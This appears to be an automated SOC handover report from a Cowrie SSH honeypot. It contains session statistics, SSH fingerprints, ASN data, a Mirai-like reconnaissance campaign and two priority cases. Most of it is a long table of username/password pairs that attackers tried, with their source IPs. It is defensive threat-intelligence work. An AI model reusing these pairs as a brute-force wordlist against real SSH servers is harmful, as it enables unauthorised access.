# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-25 |
| **Generated At** | 2026-06-25T18:14:14Z |
| **Shift Time** | 18:14 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **604** |
| Confirmed Threats | **592** |
| False Positives Filtered | **12** (2.0%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **14** |
| High Severity Cases | **297** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **307** |
| Malware Samples Analyzed | **5** HIGH · **35** MED · 5 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **309** |
| Unique Credential Pairs | **283** |
| Unique Usernames | **163** |
| Unique Passwords | **242** |
| Successful Auth Pairs | **292** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 108 |
| `admin` | 12 |
| `ubuntu` | 12 |
| `oracle` | 4 |
| `dell` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 19 |
| `` | 8 |
| `111111` | 6 |
| `LeitboGi0ro` | 6 |
| `12345` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `` | 8 |
| `root` | `LeitboGi0ro` | 6 |
| `root` | `123@@@` | 4 |
| `root` | `smo@@kkklss` | 4 |
| `admin` | `admin` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ashley` | `209.99.185.59` | 2026-06-25T12:55:55 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-06-25T12:56:08 |
| `root` | `﻿------fuck------` | `223.109.143.238` | 2026-06-25T12:56:09 |
| `superadmin` | `map19ofDragonLab` | `209.99.185.59` | 2026-06-25T12:56:48 |
| `root` | `pFz59yGXTfHz3zMS` | `209.99.185.59` | 2026-06-25T12:57:44 |
| `nisec` | `NISECTC5002` | `209.99.185.59` | 2026-06-25T12:58:39 |
| `jiangli` | `jiangli` | `209.99.185.59` | 2026-06-25T12:59:33 |
| `root` | `abc@123456` | `209.99.185.59` | 2026-06-25T13:00:28 |
| `admin` | `admin` | `141.11.88.108` | 2026-06-25T13:00:35 |
| `wjd` | `wjd` | `209.99.185.59` | 2026-06-25T13:01:24 |
| `oot` | `P@ssw0rd` | `209.99.185.59` | 2026-06-25T13:02:20 |
| `root` | `Admin@6000` | `209.99.185.59` | 2026-06-25T13:03:21 |
| `km` | `123456` | `209.99.185.59` | 2026-06-25T13:04:21 |
| `ching` | `ching` | `209.99.185.59` | 2026-06-25T13:05:21 |
| `ubuntu` | `changeme123` | `209.99.185.59` | 2026-06-25T13:06:16 |
| `hsc` | `hsc4223429Hsc2021` | `209.99.185.59` | 2026-06-25T13:07:10 |
| `wujun` | `wujun123456` | `209.99.185.59` | 2026-06-25T13:08:06 |
| `root` | `Password1` | `209.99.185.59` | 2026-06-25T13:09:05 |
| `external` | `external` | `209.99.185.59` | 2026-06-25T13:10:03 |
| `wxy` | `111111` | `209.99.185.59` | 2026-06-25T13:11:00 |
| `zhangxuan` | `123456` | `209.99.185.59` | 2026-06-25T13:11:58 |
| `root` | `abc123!@#` | `209.99.185.59` | 2026-06-25T13:12:56 |
| `ta` | `123456` | `209.99.185.59` | 2026-06-25T13:13:51 |
| `xxl` | `blabla123x!!!` | `209.99.185.59` | 2026-06-25T13:14:49 |
| `ubuntu` | `admin1` | `209.99.185.59` | 2026-06-25T13:15:49 |
| `yujie` | `111111` | `209.99.185.59` | 2026-06-25T13:16:48 |
| `root` | `adminlv123` | `209.99.185.59` | 2026-06-25T13:17:47 |
| `mzc` | `123456` | `209.99.185.59` | 2026-06-25T13:18:43 |
| `zhc` | `1234` | `209.99.185.59` | 2026-06-25T13:19:40 |
| `zhanglk` | `zhanglk123` | `209.99.185.59` | 2026-06-25T13:20:42 |
| `root` | `0744988265` | `209.99.185.59` | 2026-06-25T13:21:39 |
| `oracle` | `^%$#@!` | `209.99.185.59` | 2026-06-25T13:22:38 |
| `weblogic` | `321123` | `209.99.185.59` | 2026-06-25T13:23:38 |
| `mysql` | `123mysql1123` | `209.99.185.59` | 2026-06-25T13:24:37 |
| `xing` | `123456` | `209.99.185.59` | 2026-06-25T13:25:35 |
| `cti` | `cti` | `209.99.185.59` | 2026-06-25T13:26:32 |
| `wqy` | `123` | `209.99.185.59` | 2026-06-25T13:27:32 |
| `centos` | `admin` | `209.99.185.59` | 2026-06-25T13:28:33 |
| `ubuntu` | `pass123` | `209.99.185.59` | 2026-06-25T13:29:36 |
| `angnai` | `1234` | `209.99.185.59` | 2026-06-25T13:30:36 |
| `learning` | `learning` | `209.99.185.59` | 2026-06-25T13:31:36 |
| `root` | `jonathan` | `209.99.185.59` | 2026-06-25T13:32:36 |
| `root` | `cloud` | `209.99.185.59` | 2026-06-25T13:33:40 |
| `wcf` | `0` | `209.99.185.59` | 2026-06-25T13:34:42 |
| `jp` | `111111` | `209.99.185.59` | 2026-06-25T13:35:48 |
| `dong` | `dong123` | `209.99.185.59` | 2026-06-25T13:36:51 |
| `root` | `cheese` | `209.99.185.59` | 2026-06-25T13:37:54 |
| `ftpadmin` | `ftpadmin123456` | `209.99.185.59` | 2026-06-25T13:38:54 |
| `qtss` | `qtss111111` | `209.99.185.59` | 2026-06-25T13:39:59 |
| `localhost` | `localhost2019` | `209.99.185.59` | 2026-06-25T13:41:06 |
| `dell` | `admin@2022` | `209.99.185.59` | 2026-06-25T13:42:13 |
| `root` | `PASSWORD12` | `209.99.185.59` | 2026-06-25T13:43:21 |
| `blue` | `blue` | `209.99.185.59` | 2026-06-25T13:44:24 |
| `test2` | `12345` | `209.99.185.59` | 2026-06-25T13:45:33 |
| `ubuntu` | `git123` | `209.99.185.59` | 2026-06-25T13:46:42 |
| `outils` | `outils` | `209.99.185.59` | 2026-06-25T13:47:49 |
| `dell` | `blabla123x!!!` | `209.99.185.59` | 2026-06-25T13:48:56 |
| `yhwu` | `yhwu` | `209.99.185.59` | 2026-06-25T13:50:06 |
| `liuyx` | `lyxdmiip2020` | `209.99.185.59` | 2026-06-25T13:51:12 |
| `jhhwang` | `1234` | `209.99.185.59` | 2026-06-25T13:52:18 |
| `hzy` | `qwert123` | `209.99.185.59` | 2026-06-25T13:53:26 |
| `test1` | `test1111` | `209.99.185.59` | 2026-06-25T13:54:38 |
| `root` | `muiemulta` | `209.99.185.59` | 2026-06-25T13:55:51 |
| `root` | `admin@2017` | `209.99.185.59` | 2026-06-25T13:56:57 |
| `zyx` | `zyx` | `209.99.185.59` | 2026-06-25T13:58:02 |
| `guest` | `passw0rd` | `209.99.185.59` | 2026-06-25T13:59:06 |
| `la` | `la` | `209.99.185.59` | 2026-06-25T14:00:13 |
| `root` | `!Q2w3e4r` | `209.99.185.59` | 2026-06-25T14:00:57 |
| `yjzhao` | `ZHAOYJ1004` | `209.99.185.59` | 2026-06-25T14:01:45 |
| `anton` | `anton` | `209.99.185.59` | 2026-06-25T14:02:30 |
| `kevin` | `kevin` | `209.99.185.59` | 2026-06-25T14:03:17 |
| `root` | `krafteye` | `209.99.185.59` | 2026-06-25T14:04:06 |
| `et20-chenzy` | `Czy123` | `209.99.185.59` | 2026-06-25T14:04:49 |
| `root` | `safekeep` | `209.99.185.59` | 2026-06-25T14:05:35 |
| `root` | `1qaz2wsx3edc!@#` | `209.99.185.59` | 2026-06-25T14:06:22 |
| `oracle` | `0r4cl3` | `209.99.185.59` | 2026-06-25T14:07:08 |
| `root` | `0.00000000` | `209.99.185.59` | 2026-06-25T14:07:58 |
| `root` | `qaz!@#wsx$%^` | `209.99.185.59` | 2026-06-25T14:08:45 |
| `admin` | `passw0rd1` | `209.99.185.59` | 2026-06-25T14:09:30 |
| `sk` | `sk2024` | `209.99.185.59` | 2026-06-25T14:10:18 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-06-25T14:10:44 |
| `root` | `123@@@` | `129.153.145.135` | 2026-06-25T14:10:44 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-06-25T14:10:46 |
| `root` | `8888` | `209.99.185.59` | 2026-06-25T14:11:02 |
| `root` | `r` | `209.99.185.59` | 2026-06-25T14:11:49 |
| `root` | `p` | `209.99.185.59` | 2026-06-25T14:12:35 |
| `jinlinfang` | `jinlinfang` | `209.99.185.59` | 2026-06-25T14:13:21 |
| `root` | `PASS!` | `209.99.185.59` | 2026-06-25T14:14:12 |
| `zhaobt` | `zbtzbtzbt1` | `209.99.185.59` | 2026-06-25T14:15:01 |
| `testing` | `12345` | `209.99.185.59` | 2026-06-25T14:15:50 |
| `meklis` | `111111` | `209.99.185.59` | 2026-06-25T14:16:40 |
| `git` | `git123!` | `209.99.185.59` | 2026-06-25T14:17:30 |
| `ubuntu` | `oracle` | `209.99.185.59` | 2026-06-25T14:18:21 |
| `jack` | `test123` | `209.99.185.59` | 2026-06-25T14:19:09 |
| `ubuntu` | `pass` | `209.99.185.59` | 2026-06-25T14:19:58 |
| `monitor` | `monitor` | `209.99.185.59` | 2026-06-25T14:20:45 |
| `sqb20` | `A1kyQpBeC24=` | `209.99.185.59` | 2026-06-25T14:21:33 |
| `root` | `123456@byd` | `209.99.185.59` | 2026-06-25T14:22:20 |
| `gpu02` | `gpu02321` | `209.99.185.59` | 2026-06-25T14:23:07 |
| `redline` | `redline` | `209.99.185.59` | 2026-06-25T14:23:54 |
| `root` | `123@@@` | `64.110.90.250` | 2026-06-25T14:24:20 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-06-25T14:24:20 |
| `wan` | `111111` | `209.99.185.59` | 2026-06-25T14:24:41 |
| `www` | `www2019` | `209.99.185.59` | 2026-06-25T14:25:31 |
| `operator` | `operator` | `209.99.185.59` | 2026-06-25T14:26:19 |
| `root` | `root2010` | `209.99.185.59` | 2026-06-25T14:27:15 |
| `huashizhenwei` | `huashi2015A` | `209.99.185.59` | 2026-06-25T14:28:08 |
| `root` | `qq123` | `209.99.185.59` | 2026-06-25T14:28:57 |
| `liujian` | `liujian` | `209.99.185.59` | 2026-06-25T14:29:45 |
| `root` | `qweasd` | `209.99.185.59` | 2026-06-25T14:30:32 |
| `qzg` | `123456` | `209.99.185.59` | 2026-06-25T14:31:20 |
| `uftp` | `test321` | `209.99.185.59` | 2026-06-25T14:32:10 |
| `root` | `123qazwsx` | `209.99.185.59` | 2026-06-25T14:33:03 |
| `root` | `asdfasdf` | `209.99.185.59` | 2026-06-25T14:33:53 |
| `pischi` | `09N1RCa1Hs31` | `209.99.185.59` | 2026-06-25T14:34:43 |
| `postgres` | `postgres#123` | `209.99.185.59` | 2026-06-25T14:35:32 |
| `root` | `a123b456` | `209.99.185.59` | 2026-06-25T14:36:21 |
| `stu04` | `stu04` | `209.99.185.59` | 2026-06-25T14:37:14 |
| `root` | `868689849` | `209.99.185.59` | 2026-06-25T14:38:04 |
| `root` | `LeitboGi0ro` | `64.110.100.142` | 2026-06-25T14:38:17 |
| `root` | `123@@@` | `64.110.100.142` | 2026-06-25T14:38:17 |
| `wangxm` | `wangxm` | `209.99.185.59` | 2026-06-25T14:38:58 |
| `bourbon` | `bourbon` | `209.99.185.59` | 2026-06-25T14:39:51 |
| `tomcat` | `!QAZ2wsx` | `209.99.185.59` | 2026-06-25T14:40:42 |
| `wf` | `blabla123x!!!!` | `209.99.185.59` | 2026-06-25T14:41:31 |
| `hounana` | `hounana` | `209.99.185.59` | 2026-06-25T14:42:21 |
| `postgres` | `test123` | `209.99.185.59` | 2026-06-25T14:43:13 |
| `wgao` | `wgao1024` | `209.99.185.59` | 2026-06-25T14:44:05 |
| `root` | `Root2020` | `209.99.185.59` | 2026-06-25T14:44:56 |
| `guest` | `password1` | `209.99.185.59` | 2026-06-25T14:45:48 |
| `hitachi` | `hitachi` | `209.99.185.59` | 2026-06-25T14:46:39 |
| `zhangjie` | `123456` | `209.99.185.59` | 2026-06-25T14:47:33 |
| `yiwenl` | `yiwenl` | `209.99.185.59` | 2026-06-25T14:48:23 |
| `root` | `Passwd1` | `209.99.185.59` | 2026-06-25T14:49:17 |
| `qinqiyi` | `qinqiyi123` | `209.99.185.59` | 2026-06-25T14:50:09 |
| `cbyenguser1` | `Lay2023=` | `209.99.185.59` | 2026-06-25T14:51:00 |
| `zyp` | `zyp123` | `209.99.185.59` | 2026-06-25T14:51:52 |
| `ytm` | `ytm` | `209.99.185.59` | 2026-06-25T14:52:48 |
| `shin` | `123456` | `209.99.185.59` | 2026-06-25T14:53:46 |
| `hsc` | `4223429Hsc2021` | `209.99.185.59` | 2026-06-25T14:54:40 |
| `reese` | `reese` | `209.99.185.59` | 2026-06-25T14:55:33 |
| `root` | `q1q2q3` | `209.99.185.59` | 2026-06-25T14:56:30 |
| `luoyx66` | `123456` | `209.99.185.59` | 2026-06-25T14:57:26 |
| `anonymous` | `12345` | `209.99.185.59` | 2026-06-25T14:58:19 |
| `root` | `1234.abcd` | `209.99.185.59` | 2026-06-25T14:59:13 |
| `jira` | `password` | `209.99.185.59` | 2026-06-25T15:00:07 |
| `haewoncho` | `123456` | `209.99.185.59` | 2026-06-25T15:01:01 |
| `zhan` | `zhan` | `209.99.185.59` | 2026-06-25T15:01:55 |
| `root` | `1q2w!Q@W` | `209.99.185.59` | 2026-06-25T15:02:51 |
| `root` | `BHNzMarxayzMDT7` | `209.99.185.59` | 2026-06-25T15:03:45 |
| `dingy` | `dingy@2021` | `209.99.185.59` | 2026-06-25T15:04:42 |
| `ubuntu` | `asdf12345` | `209.99.185.59` | 2026-06-25T15:05:44 |
| `sander` | `sander1` | `209.99.185.59` | 2026-06-25T15:06:45 |
| `www-data` | `p@55w0rd` | `209.99.185.59` | 2026-06-25T15:07:39 |
| `ubuntu` | `ubuntu1234` | `209.99.185.59` | 2026-06-25T15:08:32 |
| `group_15` | `jiangtianpeng` | `209.99.185.59` | 2026-06-25T15:09:26 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-06-25T15:10:05 |
| `tianyuan` | `tianyuan` | `209.99.185.59` | 2026-06-25T15:10:24 |
| `root` | `---fuck_you----` | `218.27.202.178` | 2026-06-25T15:10:35 |
| `root` | `root1` | `209.99.185.59` | 2026-06-25T15:11:27 |
| `Apps` | `Apps` | `209.99.185.59` | 2026-06-25T15:12:27 |
| `core` | `core` | `209.99.185.59` | 2026-06-25T15:13:26 |
| `pul` | `p@ssw0rd` | `209.99.185.59` | 2026-06-25T15:14:19 |
| `lrs` | `lrs` | `209.99.185.59` | 2026-06-25T15:15:15 |
| `svn` | `svn` | `209.99.185.59` | 2026-06-25T15:16:12 |
| `uftp` | `P@ssw0rd` | `209.99.185.59` | 2026-06-25T15:17:14 |
| `odoo` | `123@abc` | `209.99.185.59` | 2026-06-25T15:18:12 |
| `ps` | `ps2020` | `209.99.185.59` | 2026-06-25T15:19:12 |
| `caoyang` | `123456` | `209.99.185.59` | 2026-06-25T15:20:10 |
| `root` | `#act@online#123` | `209.99.185.59` | 2026-06-25T15:21:05 |
| `ubuntu` | `123asd` | `209.99.185.59` | 2026-06-25T15:22:02 |
| `admin` | `admin` | `167.172.152.94` | 2026-06-25T15:22:06 |
| `wentian` | `wentian` | `209.99.185.59` | 2026-06-25T15:23:01 |
| `root` | `zxcv.1234` | `209.99.185.59` | 2026-06-25T15:24:03 |
| `groot` | `groot` | `209.99.185.59` | 2026-06-25T15:25:02 |
| `root` | `P455w0rd` | `45.198.224.120` | 2026-06-25T15:25:08 |
| `xcloud` | `1` | `209.99.185.59` | 2026-06-25T15:26:02 |
| `root` | `abc12345` | `45.205.1.42` | 2026-06-25T15:26:29 |
| `zhouh` | `p@ssw0rd` | `209.99.185.59` | 2026-06-25T15:26:59 |
| `lzy` | `123` | `209.99.185.59` | 2026-06-25T15:27:59 |
| `linuxadmin` | `linuxadmin` | `209.99.185.59` | 2026-06-25T15:28:59 |
| `flowable` | `123$%^` | `209.99.185.59` | 2026-06-25T15:30:02 |
| `root` | `741852963` | `209.99.185.59` | 2026-06-25T15:31:07 |
| `cxy` | `cxy` | `209.99.185.59` | 2026-06-25T15:32:08 |
| `opt` | `opt` | `209.99.185.59` | 2026-06-25T15:33:12 |
| `caijinzhao` | `caijinzhao` | `209.99.185.59` | 2026-06-25T15:34:11 |
| `prueba` | `prueba123` | `209.99.185.59` | 2026-06-25T15:35:13 |
| `root` | `popescu` | `209.99.185.59` | 2026-06-25T15:36:18 |
| `vyr_whmcs` | `rDA9VHGIAbB6dYHkj6NI` | `209.99.185.59` | 2026-06-25T15:37:27 |
| `install` | `install` | `45.198.224.120` | 2026-06-25T15:37:58 |
| `icp` | `icp` | `209.99.185.59` | 2026-06-25T15:38:34 |
| `root` | `Rjkj@free7248#8` | `209.99.185.59` | 2026-06-25T15:39:41 |
| `root` | `qazzxc66245` | `45.205.1.42` | 2026-06-25T15:40:40 |
| `ps` | `123456` | `209.99.185.59` | 2026-06-25T15:40:50 |
| `root` | `#changeme#` | `209.99.185.59` | 2026-06-25T15:41:52 |
| `root` | `nihao123` | `209.99.185.59` | 2026-06-25T15:42:58 |
| `root` | `support@123` | `209.99.185.59` | 2026-06-25T15:44:01 |
| `root` | `qsxesz` | `209.99.185.59` | 2026-06-25T15:45:07 |
| `developer` | `12345` | `209.99.185.59` | 2026-06-25T15:46:06 |
| `support` | `support` | `51.158.248.122` | 2026-06-25T15:47:04 |
| `user` | `rl_5672mk` | `209.99.185.59` | 2026-06-25T15:47:09 |
| `root` | `root0123456789` | `209.99.185.59` | 2026-06-25T15:48:18 |
| `haoranzheng` | `haoranzheng` | `209.99.185.59` | 2026-06-25T15:49:21 |
| `inspur` | `1!deshine` | `209.99.185.59` | 2026-06-25T15:50:24 |
| `root` | `Pass@word123` | `45.198.224.120` | 2026-06-25T15:50:59 |
| `root` | `root#123` | `209.99.185.59` | 2026-06-25T15:51:31 |
| `root` | `AA@123qweasdzxc` | `209.99.185.59` | 2026-06-25T15:52:35 |
| `dmyang` | `qfhuang0616` | `209.99.185.59` | 2026-06-25T15:53:43 |
| `superman` | `superman` | `209.99.185.59` | 2026-06-25T15:54:46 |
| `git` | `123456` | `45.205.1.42` | 2026-06-25T15:55:11 |
| `2019` | `2019` | `209.99.185.59` | 2026-06-25T15:55:53 |
| `a2` | `a2` | `209.99.185.59` | 2026-06-25T15:57:05 |
| `root` | `100200` | `209.99.185.59` | 2026-06-25T15:58:09 |
| `root` | `qq5201314` | `209.99.185.59` | 2026-06-25T15:59:13 |
| `shindei` | `123456` | `209.99.185.59` | 2026-06-25T16:00:22 |
| `server` | `test123` | `209.99.185.59` | 2026-06-25T16:01:07 |
| `root` | `123@@@` | `144.22.238.238` | 2026-06-25T16:01:44 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-06-25T16:01:45 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-06-25T16:01:52 |
| `yun` | `123456` | `209.99.185.59` | 2026-06-25T16:01:57 |
| `root` | `Million2` | `209.99.185.59` | 2026-06-25T16:02:50 |
| `test` | `1q2w3e` | `209.99.185.59` | 2026-06-25T16:03:37 |
| `root` | `maria` | `209.99.185.59` | 2026-06-25T16:04:20 |
| `root` | `welc0me` | `209.99.185.59` | 2026-06-25T16:05:03 |
| `root` | `qwerty` | `45.198.224.120` | 2026-06-25T16:05:43 |
| `ymc` | `ymc` | `209.99.185.59` | 2026-06-25T16:05:48 |
| `root` | `admin!QAZ` | `209.99.185.59` | 2026-06-25T16:06:32 |
| `kexiao` | `kexiao` | `209.99.185.59` | 2026-06-25T16:07:20 |
| `ubuntu` | `hadoop123456789` | `209.99.185.59` | 2026-06-25T16:08:07 |
| `influx` | `influx123` | `209.99.185.59` | 2026-06-25T16:08:52 |
| `root` | `woaini1314` | `209.99.185.59` | 2026-06-25T16:09:42 |
| `baoshaoqi` | `baoshaoqi` | `45.205.1.42` | 2026-06-25T16:09:45 |
| `root` | `h983hf932hf918` | `209.99.185.59` | 2026-06-25T16:10:29 |
| `root` | `Pass@word1234` | `209.99.185.59` | 2026-06-25T16:11:13 |
| `root` | `ubuntu10vm` | `209.99.185.59` | 2026-06-25T16:11:58 |
| `user` | `useruser` | `209.99.185.59` | 2026-06-25T16:12:49 |
| `root` | `qinaide520` | `209.99.185.59` | 2026-06-25T16:13:38 |
| `root` | `zaq1XSW@` | `209.99.185.59` | 2026-06-25T16:14:28 |
| `mysql` | `passpass` | `209.99.185.59` | 2026-06-25T16:15:19 |
| `ck` | `ck` | `209.99.185.59` | 2026-06-25T16:16:07 |
| `dell` | `dell@2020` | `209.99.185.59` | 2026-06-25T16:16:52 |
| `tianlixu` | `Mr.XuSheep20210523` | `209.99.185.59` | 2026-06-25T16:17:38 |
| `ubuntu` | `a11b12c13` | `209.99.185.59` | 2026-06-25T16:18:26 |
| `oracle` | `oracle!@#` | `45.198.224.120` | 2026-06-25T16:18:49 |
| `park` | `1234` | `209.99.185.59` | 2026-06-25T16:19:11 |
| `monika` | `monika` | `209.99.185.59` | 2026-06-25T16:19:58 |
| `root` | `freebsd` | `209.99.185.59` | 2026-06-25T16:20:46 |
| `root` | `Husamaja` | `209.99.185.59` | 2026-06-25T16:21:34 |
| `root` | `aqswde` | `209.99.185.59` | 2026-06-25T16:22:23 |
| `root` | `321654987` | `209.99.185.59` | 2026-06-25T16:23:16 |
| `stptbdd` | `0` | `209.99.185.59` | 2026-06-25T16:24:04 |
| `nagios` | `nagios123456` | `45.205.1.42` | 2026-06-25T16:24:09 |
| `apache` | `qwerty123456` | `209.99.185.59` | 2026-06-25T16:24:51 |
| `oracle` | `oracle1` | `209.99.185.59` | 2026-06-25T16:25:37 |
| `root` | `123456123456` | `209.99.185.59` | 2026-06-25T16:26:30 |
| `liurui` | `lei1990DUO` | `209.99.185.59` | 2026-06-25T16:27:23 |
| `server` | `12345` | `209.99.185.59` | 2026-06-25T16:28:13 |
| `funnyhome` | `funnyhome` | `209.99.185.59` | 2026-06-25T16:29:01 |
| `web4` | `web1234` | `209.99.185.59` | 2026-06-25T16:29:49 |
| `muyjy` | `IStbiMU` | `209.99.185.59` | 2026-06-25T16:30:39 |
| `root` | `zkw2bsHXSKcYkS` | `209.99.185.59` | 2026-06-25T16:31:28 |
| `web` | `web1234` | `209.99.185.59` | 2026-06-25T16:32:15 |
| `root` | `qwe123.0` | `45.198.224.120` | 2026-06-25T16:32:50 |
| `root` | `Admin@2016` | `209.99.185.59` | 2026-06-25T16:33:04 |
| `serial#` | `serial#` | `209.99.185.59` | 2026-06-25T16:33:58 |
| `root` | `qwe123..` | `209.99.185.59` | 2026-06-25T16:34:48 |
| `ftpuser` | `111111` | `209.99.185.59` | 2026-06-25T16:35:37 |
| `cajas26` | `cajas26` | `209.99.185.59` | 2026-06-25T16:36:27 |
| `zhanyi` | `zhanyi` | `209.99.185.59` | 2026-06-25T16:37:19 |
| `liangshuang` | `123456` | `209.99.185.59` | 2026-06-25T16:38:09 |
| `root` | `jasmine` | `45.205.1.42` | 2026-06-25T16:38:41 |
| `root` | `123jsd` | `209.99.185.59` | 2026-06-25T16:39:00 |
| `root` | `loveyou` | `209.99.185.59` | 2026-06-25T16:39:51 |
| `xh` | `19970322xh*` | `209.99.185.59` | 2026-06-25T16:40:42 |
| `postmaster` | `password` | `209.99.185.59` | 2026-06-25T16:41:33 |
| `gitlab-prometheus` | `gitlab-prometheus` | `209.99.185.59` | 2026-06-25T16:42:26 |
| `meklis` | `0` | `209.99.185.59` | 2026-06-25T16:43:16 |
| `jh` | `jh07` | `209.99.185.59` | 2026-06-25T16:44:05 |
| `ul` | `123456` | `209.99.185.59` | 2026-06-25T16:44:56 |
| `root` | `Indya123` | `209.99.185.59` | 2026-06-25T16:45:48 |
| `root` | `123123` | `45.198.224.120` | 2026-06-25T16:46:17 |
| `oldboy` | `123456` | `209.99.185.59` | 2026-06-25T16:46:41 |
| `ubuntu` | `dev12345` | `209.99.185.59` | 2026-06-25T16:47:35 |
| `root` | `Passwd` | `209.99.185.59` | 2026-06-25T16:48:30 |
| `haoyuanliu` | `Liuhaoyuan@ict.2022++!!` | `209.99.185.59` | 2026-06-25T16:49:20 |
| `root` | `159753` | `209.99.185.59` | 2026-06-25T16:50:09 |
| `root` | `helloworld` | `209.99.185.59` | 2026-06-25T16:51:06 |
| `root` | `!@!@` | `209.99.185.59` | 2026-06-25T16:51:58 |
| `root` | `qwert12` | `209.99.185.59` | 2026-06-25T16:52:50 |
| `root` | `PASSWORD12` | `45.205.1.42` | 2026-06-25T16:53:18 |
| `dongsheng` | `dongsheng` | `209.99.185.59` | 2026-06-25T16:53:42 |
| `hugo` | `123456` | `209.99.185.59` | 2026-06-25T16:54:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **604** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 298 |
| Paramiko (Python) | 14 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 275 | 3 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |
| `f1e5e9d24e5e...` | Mirai/variant | 4 | 1 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |
| `98f63c4d9c87...` | Generic scanner | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 275 | 3 | Generic scanner |
| `95420f9d932d...` | Go SSH scanner | 16 | 7 | — |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 4 | 1 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1082, T1105, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
busybox TEST
```
```
cat /proc
```
```
/
```
Source IPs: `141.11.88.108`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **23** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS136180` | Beijing Tiantexin Tech. Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (297)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4fb44995dc97

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 12:55 |
| **Last Seen** | 2026-06-25 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 12:55:54` | `cowrie.session.connect` |
| `2026-06-25 12:55:54` | `cowrie.client.version` |
| `2026-06-25 12:55:54` | `cowrie.client.kex` |
| `2026-06-25 12:55:55` | `cowrie.login.success` |
| `2026-06-25 12:55:56` | `cowrie.session.params` |
| `2026-06-25 12:55:56` | `cowrie.command.input` |
| `2026-06-25 12:55:56` | `cowrie.log.closed` |
| `2026-06-25 12:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d03fd18eb45

| Field | Detail |
|---|---|
| **Source IP** | `223.109.143[.]238` |
| **First Seen** | 2026-06-25 12:56 |
| **Last Seen** | 2026-06-25 12:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 12:56:08` | `cowrie.session.connect` |
| `2026-06-25 12:56:08` | `cowrie.client.version` |
| `2026-06-25 12:56:08` | `cowrie.client.kex` |
| `2026-06-25 12:56:09` | `cowrie.login.success` |
| `2026-06-25 12:56:11` | `cowrie.session.params` |
| `2026-06-25 12:56:11` | `cowrie.command.input` |
| `2026-06-25 12:56:11` | `cowrie.log.closed` |
| `2026-06-25 12:56:11` | `cowrie.session.closed` |

